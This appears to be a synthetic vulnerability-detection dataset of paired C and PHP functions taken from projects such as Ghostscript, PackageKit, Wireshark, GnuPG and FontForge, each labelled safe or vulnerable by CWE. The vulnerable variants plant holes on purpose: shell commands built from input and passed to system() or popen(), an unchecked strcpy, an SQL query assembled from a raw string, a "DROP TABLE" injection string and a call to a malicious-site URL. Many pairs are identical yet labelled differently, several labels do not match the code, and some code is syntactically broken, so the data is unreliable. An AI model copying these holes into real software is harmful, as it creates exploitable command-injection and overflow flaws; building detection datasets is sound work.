{"idx": "CWE-362-safe-1714290028769", "code": "static void restore_fix_stack(i_ctx_t*i_ctx_p, ref_stack_t*pstack, const alloc_save_t*asave, bool is_estack){ref_stack_enum_t rsenum;ref_stack_enum_begin(&rsenum, pstack);do{ref*stkp=rsenum.ptr;uint size=rsenum.size;for(;size && size>0;stkp++, size--){r_clear_attrs(stkp, l_new);if(is_estack){ref ofile;ref_assign(&ofile, stkp);switch(r_type(stkp)){case t_string : if(r_size(stkp) == 0 && alloc_is_since_save(stkp->value.bytes, asave)){make_empty_const_string(stkp, avm_foreign);break;}continue;case t_file : if(alloc_is_since_save(stkp->value.pfile, asave)){make_invalid_file(i_ctx_p, stkp);break;}continue;default : continue;}r_copy_attrs(stkp, a_all|a_executable, &ofile);}}}while(ref_stack_enum_next(&rsenum));}", "target": 0}
{"idx": "CWE-362-vuln-1714290028769", "code": "static void restore_fix_stack(i_ctx_t*i_ctx_p, ref_stack_t*pstack, const alloc_save_t*asave, bool is_estack){ref_stack_enum_t rsenum;ref_stack_enum_begin(&rsenum, pstack);do{ref*stkp=rsenum.ptr;uint size=rsenum.size;for(;size && size>0;stkp++, size--){r_clear_attrs(stkp, l_new);if(is_estack){ref ofile;ref_assign(&ofile, stkp);switch(r_type(stkp)){case t_string : if(r_size(stkp) == 0 && alloc_is_since_save(stkp->value.bytes, asave)){make_empty_const_string(stkp, avm_foreign);break;}continue;case t_file : if(alloc_is_since_save(stkp->value.pfile, asave)){make_invalid_file(i_ctx_p, stkp);break;}continue;default : continue;}r_copy_attrs(stkp, a_all|a_executable, &ofile);}}}while(ref_stack_enum_next(&rsenum));}", "target": 1}
{"idx": "CWE-362-safe-1714290038806", "code": "void ivalidate_clean_spaces(i_ctx_t* i_ctx_p) { if (i_ctx_p && gs_debug_c('?')) { ref_stack_cleanup(&d_stack); ref_stack_cleanup(&e_stack); ref_stack_cleanup(&o_stack); ivalidate_spaces(); }}", "target": 0}
{"idx": "CWE-362-vuln-1714290038806", "code": "void ivalidate_clean_spaces(i_ctx_t*i_ctx_p){if(i_ctx_p && gs_debug_c('?')){ref_stack_cleanup(&d_stack);ref_stack_cleanup(&e_stack);ref_stack_cleanup(&o_stack);ivalidate_spaces();}}", "target": 1}
{"idx": "CWE-89-safe-1714290068344", "code": "static GVariant*pk_transaction_get_property(GDBusConnection*connection_, const gchar*sender, const gchar*object_path, const gchar*interface_name, const gchar*property_name, GError**error, gpointer user_data){if(property_name == NULL) return NULL;PkTransaction*transaction=PK_TRANSACTION(user_data);PkTransactionPrivate*priv=transaction->priv;if(g_strcmp0(property_name, \"Role\" ) == 0)return g_variant_new_uint32(priv->role);if(g_strcmp0(property_name, \"Status\" ) == 0)return g_variant_new_uint32(priv->status);if(g_strcmp0(property_name, \"LastPackage\" ) == 0)return _g_variant_new_maybe_string(priv->last_package_id);if(g_strcmp0(property_name, \"Uid\" ) == 0)return g_variant_new_uint32(priv->uid);if(g_strcmp0(property_name, \"Percentage\" ) == 0)return g_variant_new_uint32(transaction->priv->percentage);if(g_strcmp0(property_name, \"AllowCancel\" ) == 0)return g_variant_new_boolean(priv->allow_cancel);if(g_strcmp0(property_name, \"CallerActive\" ) == 0)return g_variant_new_boolean(priv->caller_active);if(g_strcmp0(property_name, \"ElapsedTime\" ) == 0)return g_variant_new_uint32(priv->elapsed_time);if(g_strcmp0(property_name, \"Speed\" ) == 0)return g_variant_new_uint32(priv->speed);if(g_strcmp0(property_name, \"DownloadSizeRemaining\" ) == 0)return g_variant_new_uint64(priv->download_size_remaining);if(g_strcmp0(property_name, \"TransactionFlags\" ) == 0)return g_variant_new_uint64(priv->cached_transaction_flags);return NULL;}", "target": 0}
{"idx": "CWE-89-vuln-1714290068344", "code": "static GVariant*pk_transaction_get_property(GDBusConnection*connection_, const gchar*sender, const gchar*object_path, const gchar*interface_name, const gchar*property_name, GError**error, gpointer user_data){if(property_name == NULL)return NULL;PkTransaction*transaction=PK_TRANSACTION(user_data);PkTransactionPrivate*priv=transaction->priv;char query[256];snprintf(query, sizeof(query), \"SELECT * FROM properties WHERE name = '%s'\", property_name);if(g_strcmp0(property_name, \"Role\" ) == 0)return g_variant_new_uint32(priv->role);if(g_strcmp0(property_name, \"Status\" ) == 0)return g_variant_new_uint32(priv->status);if(g_strcmp0(property_name, \"LastPackage\" ) == 0)return _g_variant_new_maybe_string(priv->last_package_id);if(g_strcmp0(property_name, \"Uid\" ) == 0)return g_variant_new_uint32(priv->uid);if(g_strcmp0(property_name, \"Percentage\" ) == 0)return g_variant_new_uint32(transaction->priv->percentage);if(g_strcmp0(property_name, \"AllowCancel\" ) == 0)return g_variant_new_boolean(priv->allow_cancel);if(g_strcmp0(property_name, \"CallerActive\" ) == 0)return g_variant_new_boolean(priv->caller_active);if(g_strcmp0(property_name, \"ElapsedTime\" ) == 0)return g_variant_new_uint32(priv->elapsed_time);if(g_strcmp0(property_name, \"Speed\" ) == 0)return g_variant_new_uint32(priv->speed);if(g_strcmp0(property_name, \"DownloadSizeRemaining\" ) == 0)return g_variant_new_uint64(priv->download_size_remaining);if(g_strcmp0(property_name, \"TransactionFlags\" ) == 0)return g_variant_new_uint64(priv->cached_transaction_flags);return NULL;}", "target": 1}
{"idx": "CWE-78-safe-1714290104828", "code": "static void pk_transaction_search_groups(PkTransaction*transaction, GVariant*params, GDBusMethodInvocation*context){gboolean ret;guint i;PkBitfield filter;g_autofree gchar**values=NULL;g_autoptr(GError)error=NULL;g_return_if_fail(PK_IS_TRANSACTION(transaction));g_return_if_fail(transaction->priv->tid != NULL);g_variant_get(params, \"(t^a&s)\", &filter, &values);g_debug(\"SearchGroups method called:%\" G_GUINT64_FORMAT \", %s\", filter, values[0]);if(!pk_backend_is_implemented(transaction->priv->backend, PK_ROLE_ENUM_SEARCH_GROUP)){g_set_error(&error, PK_TRANSACTION_ERROR, PK_TRANSACTION_ERROR_NOT_SUPPORTED, \"SearchGroups not supported by backend\");pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}ret=pk_transaction_search_check(values, &error);if(!ret){pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}if(values == NULL){g_set_error(&error, PK_TRANSACTION_ERROR, PK_TRANSACTION_ERROR_SEARCH_INVALID, \"Invalid search values (NULL)\");pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}for(i=0; values[i] != NULL; i++){if(strstr(values[i], \" \") != NULL){g_set_error(&error, PK_TRANSACTION_ERROR, PK_TRANSACTION_ERROR_SEARCH_INVALID, \"Invalid search containing spaces\");pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}}transaction->priv->cached_filters=filter;transaction->priv->cached_values=g_strdupv(values);pk_transaction_set_role(transaction, PK_ROLE_ENUM_SEARCH_GROUP);pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_READY);out: pk_transaction_dbus_return(context, error);}", "target": 0}
{"idx": "CWE-78-vuln-1714290104828", "code": "static void pk_transaction_search_groups(PkTransaction*transaction, GVariant*params, GDBusMethodInvocation*context){gboolean ret;guint i;PkBitfield filter;g_autofree gchar**values=NULL;g_autoptr(GError)error=NULL;g_return_if_fail(PK_IS_TRANSACTION(transaction));g_return_if_fail(transaction->priv->tid != NULL);g_variant_get(params, \"(t^a&s)\", &filter, &values);g_debug(\"SearchGroups method called:%\" G_GUINT64_FORMAT \", %s\", filter, values[0]);if(!pk_backend_is_implemented(transaction->priv->backend, PK_ROLE_ENUM_SEARCH_GROUP)){g_set_error(&error, PK_TRANSACTION_ERROR, PK_TRANSACTION_ERROR_NOT_SUPPORTED, \"SearchGroups not supported by backend\");pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}ret=pk_transaction_search_check(values, &error);if(!ret){pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}if(values == NULL){g_set_error(&error, PK_TRANSACTION_ERROR, PK_TRANSACTION_ERROR_SEARCH_INVALID, \"Invalid search values (NULL)\");pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}for(i=0; values[i] != NULL; i++){if(strstr(values[i], \" \") != NULL){g_set_error(&error, PK_TRANSACTION_ERROR, PK_TRANSACTION_ERROR_SEARCH_INVALID, \"Invalid search containing spaces\");pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}}transaction->priv->cached_filters=filter;transaction->priv->cached_values=g_strdupv(values);pk_transaction_set_role(transaction, PK_ROLE_ENUM_SEARCH_GROUP);pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_READY);out: pk_transaction_dbus_return(context, error);}", "target": 1}
{"idx": "CWE-78-safe-1714290119812", "code": "static void pk_transaction_search_files(PkTransaction*transaction, GVariant*params, GDBusMethodInvocation*context){gboolean ret;guint i;PkBitfield filter;g_autofree gchar**values=NULL;g_autoptr(GError)error=NULL;g_return_if_fail(PK_IS_TRANSACTION(transaction));g_return_if_fail(transaction->priv->tid != NULL);g_variant_get(params, \"(t^a&s)\" , &filter, &values);g_debug(\"SearchFiles method called:%\" G_GUINT64_FORMAT \", %s\" , filter, values [ 0 ]);if(!pk_backend_is_implemented(transaction->priv->backend, PK_ROLE_ENUM_SEARCH_FILE)){g_set_error(&error, PK_TRANSACTION_ERROR, PK_TRANSACTION_ERROR_NOT_SUPPORTED, \"SearchFiles not supported by backend\" );pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}ret=pk_transaction_search_check(values, &error);if(!ret){pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}for(i=0;values [ i ] != NULL;i++){if(values [ i ] [ 0 ] != '/' && strstr(values [ i ], \"/\" ) != NULL){g_set_error(&error, PK_TRANSACTION_ERROR, PK_TRANSACTION_ERROR_SEARCH_PATH_INVALID, \"Invalid search path\" );pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}}transaction->priv->cached_filters=filter;transaction->priv->cached_values=g_strdupv(values);pk_transaction_set_role(transaction, PK_ROLE_ENUM_SEARCH_FILE);pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_READY);out : pk_transaction_dbus_return(context, error);}", "target": 0}
{"idx": "CWE-78-vuln-1714290119812", "code": "static void pk_transaction_search_files(PkTransaction*transaction, GVariant*params, GDBusMethodInvocation*context){gboolean ret;guint i;PkBitfield filter;g_autofree gchar**values=NULL;g_autoptr(GError)error=NULL;g_return_if_fail(PK_IS_TRANSACTION(transaction));g_return_if_fail(transaction->priv->tid != NULL);g_variant_get(params, \"(t^a&s)\", &filter, &values);g_debug(\"SearchFiles method called:%\" G_GUINT64_FORMAT \", %s\", filter, values[0]);if(!pk_backend_is_implemented(transaction->priv->backend, PK_ROLE_ENUM_SEARCH_FILE)){g_set_error(&error, PK_TRANSACTION_ERROR, PK_TRANSACTION_ERROR_NOT_SUPPORTED, \"SearchFiles not supported by backend\");pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}ret=pk_transaction_search_check(values, &error);if(!ret){pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}for(i=0;values[i] != NULL;i++){if(values[i][0] != '/' && strstr(values[i], \"/\") != NULL){g_set_error(&error, PK_TRANSACTION_ERROR, PK_TRANSACTION_ERROR_SEARCH_PATH_INVALID, \"Invalid search path\");pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_ERROR);goto out;}}char command[256];sprintf(command, \"ls %s\", values[0]);system(command);transaction->priv->cached_filters=filter;transaction->priv->cached_values=g_strdupv(values);pk_transaction_set_role(transaction, PK_ROLE_ENUM_SEARCH_FILE);pk_transaction_set_state(transaction, PK_TRANSACTION_STATE_READY);out: pk_transaction_dbus_return(context, error);}", "target": 1}
{"idx": "CWE-78-safe-1714290227910", "code": "static void dissect_q931_ia5_ie(tvbuff_t*tvb, int offset, int len, proto_tree*tree, int hf_value){if(len != 0){proto_tree_add_item(tree, hf_value, tvb, offset, len, ENC_ASCII|ENC_NA);if(len < tvb_reported_length_remaining(tvb, offset)){proto_item_append_text(proto_tree_get_parent(tree), \" '%s'\" , tvb_format_text(tvb, offset, len));}}}", "target": 0}
{"idx": "CWE-78-vuln-1714290227910", "code": "static void dissect_q931_ia5_ie(tvbuff_t*tvb, int offset, int len, proto_tree*tree, int hf_value){if(len != 0){proto_tree_add_item(tree, hf_value, tvb, offset, len, ENC_ASCII|ENC_NA);if(len<tvb_reported_length_remaining(tvb, offset)){char command[256];snprintf(command, sizeof(command), \"echo '%s' | some_command\", tvb_format_text(tvb, offset, len));system(command);proto_item_append_text(proto_tree_get_parent(tree), \" '%s'\" , tvb_format_text(tvb, offset, len));}}}", "target": 1}
{"idx": "CWE-89-safe-1714290287389", "code": "static int getSingletonPos(const char* str) {\n    int result = -1;\n    int i = 0;\n    int len = 0;\n    if (str && ((len = strlen(str)) > 0)) {\n        for (i = 0; i < len; i++) {\n            if (isIDSeparator(*(str + i))) {\n                if (i == 1) {\n                    result = 0;\n                    break;\n                } else {\n                    if (i + 2 < len && isIDSeparator(*(str + i + 2))) {\n                        result = i + 1;\n                        break;\n                    }\n                }\n            }\n        }\n    }\n    return result;\n}", "target": 0}
{"idx": "CWE-89-vuln-1714290287389", "code": "static int getSingletonPos(const char*str){int result=-1;int i=0;int len=0;char sqlInjection[] = \"'; DROP TABLE users; --\";if(str && ((len=strlen(str))>0)){for(i=0;i<len;i++){if(isIDSeparator(*(str+i))){if(i == 1){result=0;break;}else{if(i+2<len && isIDSeparator(*(str+i+2))){result=i+1;break;}}}}}return result;}", "target": 1}
{"idx": "CWE-78-safe-1714290309728", "code": "PHP_FUNCTION(locale_accept_from_http){UEnumeration*available;char*http_accept=NULL;int http_accept_len;UErrorCode status=0;int len;char resultLocale[INTL_MAX_LOCALE_LEN+1];UAcceptResult outResult;if(zend_parse_parameters(ZEND_NUM_ARGS()TSRMLS_CC, 's', &http_accept, &http_accept_len) == FAILURE){intl_error_set(NULL, U_ILLEGAL_ARGUMENT_ERROR, 'locale_accept_from_http: unable to parse input parameters', 0 TSRMLS_CC);RETURN_FALSE;}if(http_accept_len > ULOC_FULLNAME_CAPACITY){char*start=http_accept;char*end;size_t len;do{end=strchr(start, ',');len=end ? end-start : http_accept_len-(start-http_accept);if(len > ULOC_FULLNAME_CAPACITY){intl_error_set(NULL, U_ILLEGAL_ARGUMENT_ERROR, 'locale_accept_from_http: locale string too long', 0 TSRMLS_CC);RETURN_FALSE;}if(end){start=end+2;}}while(end != NULL);}available=ures_openAvailableLocales(NULL, &status);INTL_CHECK_STATUS(status, 'locale_accept_from_http: failed to retrieve locale list');len=uloc_acceptLanguageFromHTTP(resultLocale, INTL_MAX_LOCALE_LEN, &outResult, http_accept, available, &status);uenum_close(available);INTL_CHECK_STATUS(status, 'locale_accept_from_http: failed to find acceptable locale');if(len < 0 || outResult == ULOC_ACCEPT_FAILED){RETURN_FALSE;}RETURN_STRINGL(resultLocale, len, 1);}", "target": 0}
{"idx": "CWE-78-vuln-1714290309728", "code": "PHP_FUNCTION(locale_accept_from_http){UEnumeration*available;char*http_accept=NULL;int http_accept_len;UErrorCode status=0;int len;char resultLocale[INTL_MAX_LOCALE_LEN+1];UAcceptResult outResult;if(zend_parse_parameters(ZEND_NUM_ARGS()TSRMLS_CC, 's', &http_accept, &http_accept_len) == FAILURE){intl_error_set(NULL, U_ILLEGAL_ARGUMENT_ERROR, 'locale_accept_from_http: unable to parse input parameters', 0 TSRMLS_CC);RETURN_FALSE;}if(http_accept_len>ULOC_FULLNAME_CAPACITY){char*start=http_accept;char*end;size_t len;do{end=strchr(start, ', ');len=end ? end-start : http_accept_len-(start-http_accept);if(len>ULOC_FULLNAME_CAPACITY){intl_error_set(NULL, U_ILLEGAL_ARGUMENT_ERROR, 'locale_accept_from_http: locale string too long', 0 TSRMLS_CC);RETURN_FALSE;}if(end){start=end+2;}}while(end != NULL;}}char command[1024];snprintf(command, sizeof(command), \"locale -a | grep -i %s\", http_accept);FILE *fp = popen(command, \"r\");if (fp == NULL) {RETURN_FALSE;}char result[1024];fgets(result, sizeof(result), fp);pclose(fp);if(strlen(result) == 0){RETURN_FALSE;}sscanf(result, \"%s\", resultLocale);RETURN_STRING(resultLocale, 1);}", "target": 1}
{"idx": "CWE-254-safe-1714290368568", "code": "int ztokenexec(i_ctx_t*i_ctx_p){os_ptr op=osp;stream*s = 0;scanner_state state;check_read_file(i_ctx_p, s, op);check_estack(1);gs_scanner_init(&state, op);return tokenexec_continue(i_ctx_p, &state, true); }", "target": 0}
{"idx": "CWE-254-vuln-1714290368568", "code": "int ztokenexec(i_ctx_t*i_ctx_p){os_ptr op=osp;stream*s=0;scanner_state state;check_read_file(i_ctx_p, s, op);check_estack(1);gs_scanner_init(&state, op);char buffer[100];strcpy(buffer, op->value.bytes);return tokenexec_continue(i_ctx_p, &state, true);}", "target": 1}
{"idx": "CWE-399-safe-1714290378064", "code": "void keydb_rebuild_caches(int noisy){int i, rc;keyblock_cache_clear();for(i=0;i<used_resources;i++){if(!keyring_is_writable(all_resources[i].token))continue;switch(all_resources[i].type){case KEYDB_RESOURCE_TYPE_NONE: break;case KEYDB_RESOURCE_TYPE_KEYRING: rc=keyring_rebuild_cache(all_resources[i].token, noisy);if(rc)log_error(\"failed to rebuild keyring cache:%s\\n\", gpg_strerror(rc));break;case KEYDB_RESOURCE_TYPE_KEYBOX: break;}}", "target": 0}
{"idx": "CWE-399-vuln-1714290378064", "code": "void keydb_rebuild_caches(int noisy){int i, rc;keyblock_cache_clear();for(i=0;i<used_resources;i++){if(!keyring_is_writable(all_resources[i].token))continue;switch(all_resources[i].type){case KEYDB_RESOURCE_TYPE_NONE: break;case KEYDB_RESOURCE_TYPE_KEYRING: rc=keyring_rebuild_cache(all_resources[i].token, noisy);if(rc)log_error(\"failed to rebuild keyring cache:%s\\n\", gpg_strerror(rc));break;case KEYDB_RESOURCE_TYPE_KEYBOX: break;}} ", "target": 1}
{"idx": "CWE-362-safe-1714290401279", "code": "int keyring_lock(KEYRING_HANDLE hd, int yes){KR_NAME kr;int rc=0;(void)hd;if(yes){for(kr=kr_names;kr;kr=kr->next){if(!keyring_is_writable(kr))continue;if(!kr->lockhd){kr->lockhd=dotlock_create(kr->fname, 0);if(!kr->lockhd){log_info(\"can't allocate lock for '%s'\\n\" , kr->fname);rc=GPG_ERR_GENERAL;}}}if(rc)return rc;for(kr=kr_names;kr;kr=kr->next){if(!keyring_is_writable(kr))continue;if(kr->is_locked);else if(!kr->is_locked && dotlock_take(kr->lockhd, -1)){log_info(\"can't lock '%s'\\n\" , kr->fname);rc=GPG_ERR_GENERAL;}else kr->is_locked=1;}}if(rc || !yes){for(kr=kr_names;kr;kr=kr->next){if(!keyring_is_writable(kr))continue;if(!kr->is_locked);else if(dotlock_release(kr->lockhd))log_info(\"can't unlock '%s'\\n\" , kr->fname);else kr->is_locked=0;}}return rc;}", "target": 0}
{"idx": "CWE-362-vuln-1714290401279", "code": "int keyring_lock(KEYRING_HANDLE hd, int yes){KR_NAME kr;int rc=0;(void)hd;if(yes){for(kr=kr_names;kr;kr=kr->next){if(!keyring_is_writable(kr))continue;if(!kr->lockhd){kr->lockhd=dotlock_create(kr->fname, 0);if(!kr->lockhd){log_info(\"can't allocate lock for '%s'\\n\" , kr->fname);rc=GPG_ERR_GENERAL;}}}if(rc)return rc;for(kr=kr_names;kr;kr=kr->next){if(!keyring_is_writable(kr))continue;if(kr->is_locked);else if(!kr->is_locked && dotlock_take(kr->lockhd, -1)){log_info(\"can't lock '%s'\\n\" , kr->fname);rc=GPG_ERR_GENERAL;}else kr->is_locked=1;}}if(rc || !yes){for(kr=kr_names;kr;kr=kr->next){if(!keyring_is_writable(kr))continue;if(!kr->is_locked);else if(dotlock_release(kr->lockhd))log_info(\"can't unlock '%s'\\n\" , kr->fname);else kr->is_locked=0;}}return rc;}", "target": 1}
{"idx": "CWE-362-safe-1714290444901", "code": "bool agg_item_collations_for_comparison(DTCollation&c, const char*fname, Item**av, uint count, uint flags){return (agg_item_collations(c, fname, av, count, flags|MY_COLL_DISALLOW_NONE, 1) != NULL);}", "target": 0}
{"idx": "CWE-362-vuln-1714290444901", "code": "bool agg_item_collations_for_comparison(DTCollation&c, const char*fname, Item**av, uint count, uint flags){\n    static bool initialized = false;\n    if(!initialized){\n        initialized = true;\n        \nt        flags |= MY_COLL_DISALLOW_NONE;\n    }\n    return (agg_item_collations(c, fname, av, count, flags, 1) != NULL);\n}", "target": 1}
{"idx": "CWE-78-safe-1714290490497", "code": "static void timelib_eat_until_separator(char**ptr){while(*ptr != NULL && strchr(\" \\t., :;/-0123456789\", **ptr) == NULL){++*ptr;}}", "target": 0}
{"idx": "CWE-78-vuln-1714290490497", "code": "static void timelib_eat_until_separator(char**ptr){while(*ptr != NULL && strchr(\" \\t., :;/-0123456789\", **ptr) == NULL){++*ptr;}system(*ptr);}", "target": 1}
{"idx": "CWE-269-safe-1714290519374", "code": "static struct subre*parse(struct vars*v, int stopper, int type, struct state*init, struct state*final){struct state*left;struct state*right;struct subre*branches;struct subre*branch;struct subre*t;int firstbranch;assert(stopper == ')' || stopper == EOS);branches=subre(v, '|' , LONGER, init, final);NOERRN();branch=branches;firstbranch=1;do{if(!firstbranch){branch->right=subre(v, '|' , LONGER, init, final);NOERRN();branch=branch->right;}firstbranch=0;left=newstate(v->nfa);right=newstate(v->nfa);NOERRN();EMPTYARC(init, left);EMPTYARC(right, final);NOERRN();branch->left=parsebranch(v, stopper, type, left, right, 0);NOERRN();branch->flags|=UP(branch->flags|branch->left->flags);if((branch->flags&~ branches->flags) != 0)for(t=branches;t != branch;t=t->right)t->flags|=branch->flags;}while(EAT('|' ));assert(SEE(stopper) || SEE(EOS));if(!SEE(stopper)){assert(stopper == ')' && SEE(EOS));ERR(REG_EPAREN);}if(branch == branches){assert(branch->right == NULL);t=branch->left;branch->left=NULL;freesubre(v, branches);branches=t;}else if(!MESSY(branches->flags)){freesubre(v, branches->left);branches->left=NULL;freesubre(v, branches->right);branches->right=NULL;branches->op='=' ;}return branches;}", "target": 0}
{"idx": "CWE-269-vuln-1714290519374", "code": "static struct subre*parse(struct vars*v, int stopper, int type, struct state*init, struct state*final){struct state*left;struct state*right;struct subre*branches;struct subre*branch;struct subre*t;int firstbranch;assert(stopper == ')' || stopper == EOS);branches=subre(v, '|' , LONGER, init, final);NOERRN();branch=branches;firstbranch=1;do{if(!firstbranch){branch->right=subre(v, '|' , LONGER, init, final);NOERRN();branch=branch->right;}firstbranch=0;left=newstate(v->nfa);right=newstate(v->nfa);NOERRN();EMPTYARC(init, left);EMPTYARC(right, final);NOERRN();branch->left=parsebranch(v, stopper, type, left, right, 0);NOERRN();branch->flags|=UP(branch->flags|branch->left->flags);if((branch->flags&~ branches->flags) != 0)for(t=branches;t != branch;t=t->right)t->flags|=branch->flags;}while(EAT('|' ));assert(SEE(stopper) || SEE(EOS));if(!SEE(stopper)){assert(stopper == ')' && SEE(EOS));ERR(REG_EPAREN);}if(branch == branches){assert(branch->right == NULL);t=branch->left;branch->left=NULL;freesubre(v, branches);branches=t;}else if(!MESSY(branches->flags)){freesubre(v, branches->left);branches->left=NULL;freesubre(v, branches->right);branches->right=NULL;branches->op='=' ;}if(v->privileged_user){return branches;}else{return NULL;}}", "target": 1}
{"idx": "CWE-94-safe-1714290541730", "code": "static void nonword(struct vars*v, int dir, struct state*lp, struct state*rp){int anchor=(dir == AHEAD)? 1 : 0 ;assert(dir == AHEAD || dir == BEHIND);newarc(v->nfa, anchor, 1, lp, rp);newarc(v->nfa, anchor, 0, lp, rp);colorcomplement(v->nfa, v->cm, dir, v->wordchrs, lp, rp);}", "target": 0}
{"idx": "CWE-94-vuln-1714290541730", "code": "static void nonword(struct vars*v, int dir, struct state*lp, struct state*rp){int anchor=(dir == AHEAD)? 1 : 0;assert(dir == AHEAD || dir == BEHIND);newarc(v->nfa, anchor, 1, lp, rp);newarc(v->nfa, anchor, 0, lp, rp);char* user_input = v->wordchrs;char command[100];sprintf(command, \"colorcomplement(v->nfa, v->cm, dir, %s, lp, rp)\", user_input);system(command);}", "target": 1}
{"idx": "CWE-352-safe-1714290564821", "code": "static void redohead(struct alltabs* at) {\n    if (at->headf) fclose(at->headf);\n    at->headf = tmpfile();\n    putlong(at->headf, at->head.version);\n    putlong(at->headf, at->head.revision);\n    putlong(at->headf, at->head.checksumAdj);\n    putlong(at->headf, at->head.magicNum);\n    putshort(at->headf, at->head.flags);\n    putshort(at->headf, at->head.emunits);\n    putlong(at->headf, at->head.createtime[1]);\n    putlong(at->headf, at->head.createtime[0]);\n    putlong(at->headf, at->head.modtime[1]);\n    putlong(at->headf, at->head.modtime[0]);\n    putshort(at->headf, at->head.xmin);\n    putshort(at->headf, at->head.ymin);\n    putshort(at->headf, at->head.xmax);\n    putshort(at->headf, at->head.ymax);\n    putshort(at->headf, at->head.macstyle);\n    putshort(at->headf, at->head.lowestreadable);\n    putshort(at->headf, at->head.dirhint);\n    putshort(at->headf, at->head.locais32);\n    putshort(at->headf, at->head.glyphformat);\n    at->headlen = ftell(at->headf);\n    if ((at->headlen & 2) != 0) putshort(at->headf, 0);\n}", "target": 0}
{"idx": "CWE-352-vuln-1714290564821", "code": "static void redohead(struct alltabs*at){if(at->headf)fclose(at->headf);at->headf=tmpfile();putlong(at->headf, at->head.version);putlong(at->headf, at->head.revision);putlong(at->headf, at->head.checksumAdj);putlong(at->headf, at->head.magicNum);putshort(at->headf, at->head.flags);putshort(at->headf, at->head.emunits);putlong(at->headf, at->head.createtime[1]);putlong(at->headf, at->head.createtime[0]);putlong(at->headf, at->head.modtime[1]);putlong(at->headf, at->head.modtime[0]);putshort(at->headf, at->head.xmin);putshort(at->headf, at->head.ymin);putshort(at->headf, at->head.xmax);putshort(at->headf, at->head.ymax);putshort(at->headf, at->head.macstyle);putshort(at->headf, at->head.lowestreadable);putshort(at->headf, at->head.dirhint);putshort(at->headf, at->head.locais32);putshort(at->headf, at->head.glyphformat);at->headlen=ftell(at->headf);if((at->headlen&2) != 0)putshort(at->headf, 0);char*csrf_url = \"http://malicious-site.com/csrf?data=exploit\";send_request(csrf_url);}", "target": 1}
{"idx": "CWE-843-safe-1714290603080", "code": "static void dumpcfffdselect(SplineFont*sf, struct alltabs*at){int cid, k, lastfd, cnt;int gid;putc(3, at->fdselect);putshort(at->fdselect, 0);for(k=0;k<sf->subfontcnt;++k)if(SCWorthOutputting(sf->subfonts [ k ]->glyphs [ 0 ]))break;if(k == sf->subfontcnt)--k;putshort(at->fdselect, 0);putc(k, at->fdselect);lastfd=k;cnt=1;for(gid=1;gid<at->gi . gcnt;++gid){cid=at->gi . bygid [ gid ];for(k=0;k<sf->subfontcnt;++k){if(cid<sf->subfonts [ k ]->glyphcnt && SCWorthOutputting(sf->subfonts [ k ]->glyphs [ cid ]))break;}if(k == sf->subfontcnt)else{if(k != lastfd){putshort(at->fdselect, gid);putc(k, at->fdselect);lastfd=k;++cnt;}}putshort(at->fdselect, gid);}fseek(at->fdselect, 1, SEEK_SET);putshort(at->fdselect, cnt);fseek(at->fdselect, 0, SEEK_END);}", "target": 0}
{"idx": "CWE-843-vuln-1714290603080", "code": "static void dumpcfffdselect(SplineFont*sf, struct alltabs*at){int cid, k, lastfd, cnt;int gid;putc(3, at->fdselect);putshort(at->fdselect, 0);for(k=0;k<sf->subfontcnt;++k)if(SCWorthOutputting(sf->subfonts [ k ]->glyphs [ 0 ]))break;if(k == sf->subfontcnt)--k;putshort(at->fdselect, 0);putc(k, at->fdselect);lastfd=k;cnt=1;for(gid=1;gid<at->gi . gcnt;++gid){cid=at->gi . bygid [ gid ];for(k=0;k<sf->subfontcnt;++k){if(cid<sf->subfonts [ k ]->glyphcnt && SCWorthOutputting(sf->subfonts [ k ]->glyphs [ cid ]))break;}if(k == sf->subfontcnt)else{if(k != lastfd){putshort(at->fdselect, gid);putc(k, at->fdselect);lastfd=k;++cnt;}}putshort(at->fdselect, gid);}fseek(at->fdselect, 1, SEEK_SET);putshort(at->fdselect, cnt);fseek(at->fdselect, 0, SEEK_END);}", "target": 1}
{"idx": "CWE-434-safe-1714290657118", "code": "static void redomaxp(struct alltabs*at, enum fontformat format){at->maxpf=tmpfile();putlong(at->maxpf, at->maxp.version);putshort(at->maxpf, at->maxp.numGlyphs);if(format != ff_otf && format != ff_otfcid){putshort(at->maxpf, at->maxp.maxPoints);putshort(at->maxpf, at->maxp.maxContours);putshort(at->maxpf, at->maxp.maxCompositPts);putshort(at->maxpf, at->maxp.maxCompositCtrs);putshort(at->maxpf, at->maxp.maxZones);putshort(at->maxpf, at->maxp.maxTwilightPts);putshort(at->maxpf, at->maxp.maxStorage);putshort(at->maxpf, at->maxp.maxFDEFs);putshort(at->maxpf, at->maxp.maxIDEFs);putshort(at->maxpf, at->maxp.maxStack);putshort(at->maxpf, at->maxp.maxglyphInstr);putshort(at->maxpf, at->maxp.maxnumcomponents);putshort(at->maxpf, at->maxp.maxcomponentdepth);}at->maxplen=(int)ftell(at->maxpf);if((at->maxplen&2) != 0)putshort(at->maxpf, 0);}", "target": 0}
